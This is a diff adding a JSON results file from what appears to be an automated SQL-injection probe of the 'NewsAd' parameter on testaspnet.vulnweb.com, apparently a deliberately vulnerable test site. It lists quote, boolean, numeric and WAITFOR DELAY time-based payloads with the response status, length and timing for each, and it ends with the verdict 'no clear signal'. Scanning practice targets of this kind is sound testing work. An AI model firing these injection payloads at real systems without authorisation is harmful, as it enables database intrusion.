@@ -1,0 +1,74 @@
+{
+  "generated_at": "2026-11-23T20:02:10.338539+00:00",
+  "target": "http://testaspnet.vulnweb.com/ReadNews.aspx?id=2&NewsAd=ads/def.html",
+  "raw_results": {
+    "baseline": {
+      "url": "http://testaspnet.vulnweb.com/ReadNews.aspx?id=2&NewsAd=ads/def.html",
+      "status": 200,
+      "length": 30675,
+      "elapsed": 0.872,
+      "sql_error": false,
+      "error_snippet": null
+    },
+    "error_quote": {
+      "url": "http://testaspnet.vulnweb.com/ReadNews.aspx?id=2&NewsAd=ads%2Fdef.html%27",
+      "status": 200,
+      "length": 30677,
+      "elapsed": 0.264,
+      "sql_error": false,
+      "error_snippet": null,
+      "payload": "ads/def.html'"
+    },
+    "boolean_true": {
+      "url": "http://testaspnet.vulnweb.com/ReadNews.aspx?id=2&NewsAd=ads%2Fdef.html%27+AND+1%3D1+--+",
+      "status": 200,
+      "length": 30723,
+      "elapsed": 0.29,
+      "sql_error": false,
+      "error_snippet": null,
+      "payload": "ads/def.html' AND 1=1 -- "
+    },
+    "boolean_false": {
+      "url": "http://testaspnet.vulnweb.com/ReadNews.aspx?id=2&NewsAd=ads%2Fdef.html%27+AND+1%3D2+--+",
+      "status": 200,
+      "length": 30723,
+      "elapsed": 0.266,
+      "sql_error": false,
+      "error_snippet": null,
+      "payload": "ads/def.html' AND 1=2 -- "
+    },
+    "time_delay": {
+      "url": "http://testaspnet.vulnweb.com/ReadNews.aspx?id=2&NewsAd=ads%2Fdef.html%27+WAITFOR+DELAY+%270%3A0%3A5%27+--+",
+      "status": 200,
+      "length": 30769,
+      "elapsed": 0.282,
+      "sql_error": false,
+      "error_snippet": null,
+      "payload": "ads/def.html' WAITFOR DELAY '0:0:5' -- "
+    },
+    "numeric_true": {
+      "url": "http://testaspnet.vulnweb.com/ReadNews.aspx?id=2&NewsAd=ads%2Fdef.html+AND+1%3D1",
+      "status": 200,
+      "length": 30705,
+      "elapsed": 0.28,
+      "sql_error": false,
+      "error_snippet": null,
+      "payload": "ads/def.html AND 1=1"
+    },
+    "numeric_false": {
+      "url": "http://testaspnet.vulnweb.com/ReadNews.aspx?id=2&NewsAd=ads%2Fdef.html+AND+1%3D2",
+      "status": 200,
+      "length": 30705,
+      "elapsed": 0.295,
+      "sql_error": false,
+      "error_snippet": null,
+      "payload": "ads/def.html AND 1=2"
+    }
+  },
+  "analysis": {
+    "parameter": "NewsAd",
+    "original_value": "ads/def.html",
+    "signals": [],
+    "verdict": "no clear signal"
+  }
+}
